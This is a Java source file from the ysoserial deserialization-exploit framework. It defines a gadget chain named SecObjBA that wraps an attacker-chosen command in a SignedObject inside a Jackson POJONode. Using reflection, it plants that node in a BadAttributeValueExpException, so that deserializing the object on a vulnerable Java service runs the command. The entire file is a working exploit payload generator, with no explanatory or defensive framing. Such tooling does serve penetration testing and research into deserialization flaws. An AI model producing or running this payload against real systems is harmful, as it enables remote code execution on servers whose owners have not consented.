package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.lang.reflect.Field;

import static ysoserial.payloads.util.Gadgets.createSignedObject;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("jackson:jackson")
@Authors({ Authors.J1an })
public class SecObjBA extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        SignedObject signedObject = createSignedObject(command);
        POJONode node = new POJONode(signedObject);
        BadAttributeValueExpException val = new BadAttributeValueExpException("J1an");
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, node);
        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SecObjBA.class, args);
    }
}
